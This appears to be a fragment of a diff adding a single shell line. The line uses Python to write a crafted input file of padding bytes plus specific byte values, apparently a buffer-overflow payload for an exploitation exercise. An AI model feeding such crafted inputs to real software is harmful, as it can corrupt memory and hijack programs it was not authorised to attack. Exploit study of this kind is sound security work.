@@ -1,0 +1,2 @@
+python -c "print('A'*40 + '\xce' + '\n' + 'A'*200 + '\x8c' + 'HUUUUUU')" > /tmp/x 
+
